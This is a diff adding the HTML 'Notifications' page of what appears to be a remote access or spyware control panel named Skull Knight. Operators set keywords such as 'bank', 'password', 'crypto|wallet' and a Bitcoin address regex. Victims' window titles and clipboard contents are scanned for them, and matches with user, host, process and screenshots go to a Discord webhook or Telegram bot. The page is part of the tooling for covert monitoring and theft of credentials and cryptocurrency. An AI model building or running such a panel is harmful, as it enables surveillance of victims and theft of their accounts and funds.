@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Notifications - Skull Knight</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script defer src="https://cdn.jsdelivr.net/npm/msgpackr@1.11.8/dist/index.js"></script>
+    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.36.5/ace.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <script defer src="/assets/toast.js"></script>
+    <script defer src="/assets/ripple.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="px-5 py-6">
+      <div class="max-w-7xl mx-auto flex flex-col gap-6">
+
+        <!-- Page header -->
+        <div class="flex flex-wrap items-start justify-between gap-4">
+          <div>
+            <h1 class="text-2xl font-semibold">Notifications</h1>
+            <p class="text-slate-400">
+              Active window &amp; clipboard alerts based on configured keyword patterns
+            </p>
+          </div>
+          <div class="flex flex-wrap items-center gap-3">
+            <span
+              id="ws-status"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-full bg-slate-900/70 text-slate-200 border border-slate-800"
+            >
+              <i class="fa-solid fa-circle-dot text-slate-400"></i>
+              <span>Connecting...</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Keyword Configuration (admin / operator only) -->
+        <div id="keyword-section" class="hidden bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3">
+            <div>
+              <h2 class="text-lg font-semibold">Keyword Configuration</h2>
+              <p class="text-sm text-slate-400">
+                One keyword per line — plain substring or <code class="text-slate-300">/regex/i</code> syntax. Changes apply to connected agents immediately. (Shared global setting)
+              </p>
+            </div>
+            <button
+              id="save-keywords"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save Keywords</span>
+            </button>
+          </div>
+          <textarea
+            id="keyword-input"
+            rows="5"
+            placeholder="bank&#10;password&#10;admin&#10;/crypto|wallet/i&#10;/\b(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{24,33})\b/"
+            class="mt-3 w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 focus:outline-none focus:border-blue-500"
+          ></textarea>
+          <label class="mt-3 inline-flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
+            <input id="clipboard-enabled" type="checkbox" class="w-4 h-4 accent-emerald-500" />
+            Monitor clipboard content for keyword matches
+          </label>
+          <div class="mt-2 text-xs text-slate-500" id="keyword-hint"></div>
+        </div>
+
+        <!-- Per-user Webhook Delivery -->
+        <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3">
+            <div>
+              <h2 class="text-lg font-semibold">My Webhook</h2>
+              <p class="text-sm text-slate-400">
+                Your personal webhook — receives notifications only for clients you can access.
+              </p>
+            </div>
+            <button
+              id="save-webhook"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save</span>
+            </button>
+          </div>
+
+          <label class="mt-4 inline-flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
+            <input id="webhook-enabled" type="checkbox" class="w-4 h-4 accent-emerald-500" />
+            Enable webhook delivery
+          </label>
+
+          <div class="mt-3 relative">
+            <input
+              id="webhook-url"
+              type="password"
+              autocomplete="off"
+              placeholder="https://example.com/notify  (or Discord webhook URL)"
+              class="w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 pr-10 focus:outline-none focus:border-blue-500"
+            />
+            <div style="position:absolute; right:0.75rem; top:50%; transform:translateY(-50%); display:flex; align-items:center;">
+              <button id="webhook-url-toggle" type="button" class="text-slate-400 hover:text-slate-200 leading-none" title="Show / hide">
+                <i class="fa-solid fa-eye"></i>
+              </button>
+            </div>
+          </div>
+
+          <!-- Webhook template editor -->
+          <div class="mt-4">
+            <div class="flex items-center justify-between flex-wrap gap-2 mb-1">
+              <span class="text-sm font-medium text-slate-300">Request Body Template</span>
+              <div class="flex gap-2">
+                <button id="reset-webhook-template" type="button"
+                  class="text-xs px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300">
+                  Use Premade Template
+                </button>
+                <button id="format-webhook-template" type="button"
+                  class="text-xs px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300">
+                  Format JSON
+                </button>
+                <button id="preview-webhook-template" type="button"
+                  class="text-xs px-2 py-1 rounded bg-blue-700 hover:bg-blue-600 text-white">
+                  <i class="fa-solid fa-eye mr-1"></i>Preview
+                </button>
+              </div>
+            </div>
+            <div
+              id="webhook-template"
+              class="w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 focus-within:border-blue-500"
+              style="height: 180px;"
+            ></div>
+            <p class="mt-1 text-xs text-slate-500">
+              Variables: <code class="text-slate-400">{title}</code>
+              <code class="text-slate-400">{keyword}</code>
+              <code class="text-slate-400">{clientId}</code>
+              <code class="text-slate-400">{user}</code>
+              <code class="text-slate-400">{host}</code>
+              <code class="text-slate-400">{process}</code>
+              <code class="text-slate-400">{os}</code>
+              <code class="text-slate-400">{pid}</code>
+              <code class="text-slate-400">{ts}</code>
+              &nbsp;&mdash; Discord webhook URLs auto-format as embeds.
+            </p>
+            <div id="webhook-template-preview"
+              class="hidden mt-3 bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono text-slate-300 whitespace-pre-wrap max-h-48 overflow-y-auto">
+            </div>
+          </div>
+        </div>
+
+        <!-- Per-user Telegram Bot Delivery -->
+        <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3">
+            <div>
+              <h2 class="text-lg font-semibold">My Telegram Bot</h2>
+              <p class="text-sm text-slate-400">
+                Your personal Telegram bot — receives notifications only for clients you can access.
+              </p>
+            </div>
+            <button
+              id="save-telegram"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save</span>
+            </button>
+          </div>
+
+          <label class="mt-4 inline-flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
+            <input id="telegram-enabled" type="checkbox" class="w-4 h-4 accent-emerald-500" />
+            Enable Telegram delivery
+          </label>
+
+          <div class="mt-3 grid grid-cols-1 gap-3 sm:grid-cols-2">
+            <div class="relative">
+              <input
+                id="telegram-bot-token"
+                type="password"
+                autocomplete="off"
+                placeholder="Bot token  (e.g. 123456:ABC-DEF...)"
+                class="w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 pr-10 focus:outline-none focus:border-blue-500"
+              />
+              <div style="position:absolute; right:0.75rem; top:50%; transform:translateY(-50%); display:flex; align-items:center;">
+                <button id="telegram-token-toggle" type="button" class="text-slate-400 hover:text-slate-200 leading-none" title="Show / hide">
+                  <i class="fa-solid fa-eye"></i>
+                </button>
+              </div>
+            </div>
+            <div class="relative">
+              <input
+                id="telegram-chat-id"
+                type="password"
+                autocomplete="off"
+                placeholder="Chat ID  (e.g. 123456789 or -100...)"
+                class="w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 pr-10 focus:outline-none focus:border-blue-500"
+              />
+              <div style="position:absolute; right:0.75rem; top:50%; transform:translateY(-50%); display:flex; align-items:center;">
+                <button id="telegram-chatid-toggle" type="button" class="text-slate-400 hover:text-slate-200 leading-none" title="Show / hide">
+                  <i class="fa-solid fa-eye"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Telegram template editor -->
+          <div class="mt-4">
+            <div class="flex items-center justify-between flex-wrap gap-2 mb-1">
+              <span class="text-sm font-medium text-slate-300">Message Template</span>
+              <div class="flex gap-2">
+                <button id="reset-telegram-template" type="button"
+                  class="text-xs px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300">
+                  Use Premade Template
+                </button>
+                <button id="preview-telegram-template" type="button"
+                  class="text-xs px-2 py-1 rounded bg-blue-700 hover:bg-blue-600 text-white">
+                  <i class="fa-solid fa-eye mr-1"></i>Preview
+                </button>
+              </div>
+            </div>
+            <textarea
+              id="telegram-template"
+              rows="4"
+              placeholder="Premade template will be loaded automatically"
+              class="w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 font-mono text-xs focus:outline-none focus:border-blue-500"
+            ></textarea>
+            <p class="mt-1 text-xs text-slate-500">
+              Variables: <code class="text-slate-400">{title}</code>
+              <code class="text-slate-400">{keyword}</code>
+              <code class="text-slate-400">{clientId}</code>
+              <code class="text-slate-400">{user}</code>
+              <code class="text-slate-400">{host}</code>
+              <code class="text-slate-400">{process}</code>
+              <code class="text-slate-400">{os}</code>
+              <code class="text-slate-400">{pid}</code>
+              <code class="text-slate-400">{ts}</code>
+            </p>
+            <div id="telegram-template-preview"
+              class="hidden mt-3 bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono text-slate-300 whitespace-pre-wrap max-h-48 overflow-y-auto">
+            </div>
+          </div>
+        </div>
+
+        <!-- Desktop Event Notifications -->
+        <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3 mb-4">
+            <div>
+              <h2 class="text-lg font-semibold">Desktop Event Notifications</h2>
+              <p class="text-sm text-slate-400">
+                Choose which client events trigger a desktop (OS) notification.
+              </p>
+            </div>
+            <button
+              id="save-event-notifs"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save</span>
+            </button>
+          </div>
+
+          <!-- Browser permission status -->
+          <div id="desktop-notif-status-bar" class="flex flex-wrap items-center gap-3 mb-4 rounded-lg border px-4 py-3 text-sm">
+            <i id="desktop-notif-status-icon" class="fa-solid fa-circle-dot text-base"></i>
+            <span id="desktop-notif-status-text" class="flex-1">Checking permission…</span>
+            <button
+              id="desktop-notif-enable-btn"
+              class="hidden inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-sky-600 hover:bg-sky-500 transition-colors text-white font-medium"
+              type="button"
+            >
+              <i class="fa-solid fa-bell"></i>
+              Enable Notifications
+            </button>
+            <p id="desktop-notif-denied-hint" class="hidden w-full text-xs text-amber-400 mt-1">
+              <i class="fa-solid fa-triangle-exclamation mr-1"></i>
+              Notifications are blocked. Reset notification permissions for this site in your browser settings, then reload.
+            </p>
+          </div>
+
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="event-notif-online" type="checkbox" class="h-4 w-4 accent-emerald-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium">&#x1F7E2; Client Online</span>
+                <span class="text-slate-500 text-xs">Fire when a client connects</span>
+              </span>
+            </label>
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="event-notif-offline" type="checkbox" class="h-4 w-4 accent-red-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium">&#x1F534; Client Offline</span>
+                <span class="text-slate-500 text-xs">Fire when a client disconnects</span>
+              </span>
+            </label>
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="event-notif-purgatory" type="checkbox" class="h-4 w-4 accent-yellow-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium">&#x1F7E1; Client in Purgatory</span>
+                <span class="text-slate-500 text-xs">Fire when a client awaits approval</span>
+              </span>
+            </label>
+          </div>
+        </div>
+
+        <!-- Client Event Delivery Channels -->
+        <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3 mb-4">
+            <div>
+              <h2 class="text-lg font-semibold">Client Event Delivery Channels</h2>
+              <p class="text-sm text-slate-400">
+                Choose which channels receive client lifecycle events (online, offline, purgatory).
+              </p>
+            </div>
+            <button
+              id="save-event-channels"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save</span>
+            </button>
+          </div>
+
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="client-event-webhook" type="checkbox" class="h-4 w-4 accent-indigo-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium"><i class="fa-brands fa-discord mr-1"></i> Discord Webhook</span>
+                <span class="text-slate-500 text-xs">Send client events to your webhook</span>
+              </span>
+            </label>
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="client-event-telegram" type="checkbox" class="h-4 w-4 accent-sky-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium"><i class="fa-brands fa-telegram mr-1"></i> Telegram Bot</span>
+                <span class="text-slate-500 text-xs">Send client events to your Telegram</span>
+              </span>
+            </label>
+            <label class="flex items-center gap-3 rounded-lg bg-slate-950 border border-slate-800 px-4 py-3 cursor-pointer hover:border-slate-600 transition-colors">
+              <input id="client-event-push" type="checkbox" class="h-4 w-4 accent-emerald-500 shrink-0" />
+              <span class="flex flex-col gap-0.5">
+                <span class="text-slate-200 font-medium"><i class="fa-solid fa-bell mr-1"></i> Push Notifications</span>
+                <span class="text-slate-500 text-xs">Send client events via browser push</span>
+              </span>
+            </label>
+          </div>
+        </div>
+
+        <!-- Notification feed -->
+        <div
+          id="notification-panel"
+          class="bg-slate-900/60 border border-slate-800 rounded-xl p-4"
+        >
+          <div class="flex items-center justify-between mb-3">
+            <div>
+              <h2 class="text-lg font-semibold">Notifications</h2>
+              <p id="notification-scope-hint" class="text-xs text-slate-500 mt-0.5">
+                Showing notifications for your accessible clients.
+              </p>
+            </div>
+          </div>
+          <div class="overflow-x-auto max-h-96">
+            <table class="min-w-full text-sm">
+              <thead class="text-slate-400 sticky top-0 bg-slate-900">
+                <tr class="text-left">
+                  <th class="py-2 pr-4">Time</th>
+                  <th class="py-2 pr-4">Client</th>
+                  <th class="py-2 pr-4">User</th>
+                  <th class="py-2 pr-4">Title / Content</th>
+                  <th class="py-2 pr-4">Process</th>
+                  <th class="py-2 pr-4">Keyword</th>
+                  <th class="py-2 pr-4">Source</th>
+                  <th class="py-2 pr-4">Preview</th>
+                </tr>
+              </thead>
+              <tbody id="notification-list" class="text-slate-200"></tbody>
+            </table>
+          </div>
+          <div
+            id="empty-state"
+            class="py-6 text-center text-slate-400"
+          >
+            No notifications yet.
+          </div>
+        </div>
+
+        <!-- Screenshot zoom modal -->
+        <div
+          id="notification-preview-modal"
+          class="hidden fixed inset-0 z-50 items-center justify-center bg-black/70 p-6"
+        >
+          <button
+            id="notification-preview-close"
+            class="absolute top-5 right-5 inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-100"
+          >
+            <i class="fa-solid fa-xmark"></i>
+            <span>Close</span>
+          </button>
+          <img
+            id="notification-preview-image"
+            alt="Notification preview"
+            class="max-h-[80vh] max-w-[90vw] rounded-xl border border-slate-700 shadow-2xl"
+          />
+        </div>
+
+      </div>
+    </main>
+
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/notifications.js"></script>
+  </body>
+</html>
